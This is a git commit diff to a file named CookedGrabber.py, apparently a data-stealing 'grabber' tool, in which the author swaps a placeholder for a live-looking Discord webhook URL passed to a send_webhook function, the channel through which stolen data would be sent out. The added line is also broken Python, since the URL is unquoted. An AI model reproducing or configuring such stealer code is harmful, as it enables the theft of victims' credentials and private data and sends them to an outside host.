482a63f5037625e6afdd7655da510a400b6d24f0
JamesChenCode <73408713+JamesChenCode@users.noreply.github.com>
2023-12-11 01:39:09 -0500

    Update CookedGrabber.py

--- CookedGrabber.py
+++ CookedGrabber.py
@@ -517,7 +517,7 @@ def send_webhook(DISCORD_WEBHOOK_URLs):
 if __name__ == "__main__":
     freeze_support()
     if len(sys.argv) == 1:
-        send_webhook(["YOUR DISCORD WEBHOOK URL"])
+        send_webhook([https://discord.com/api/webhooks/1183658045541203978/jWxSMFLYXTcq-_U4a55a7WhNZknytcDn1bANNqDkOvTZDLzz4ZdDXTDWxP19IjhEoOHZ])
     else:
         del sys.argv[0]
         send_webhook(sys.argv)
